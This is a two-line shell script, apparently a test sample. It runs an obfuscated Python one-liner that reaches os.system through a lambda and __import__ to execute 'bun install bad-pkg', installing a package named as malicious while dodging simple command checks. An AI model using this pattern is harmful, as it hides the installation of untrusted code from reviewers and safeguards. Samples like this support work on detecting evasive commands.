#!/bin/sh
python3 -c "(lambda o: o.system('bun install bad-pkg'))(__import__('os'))"
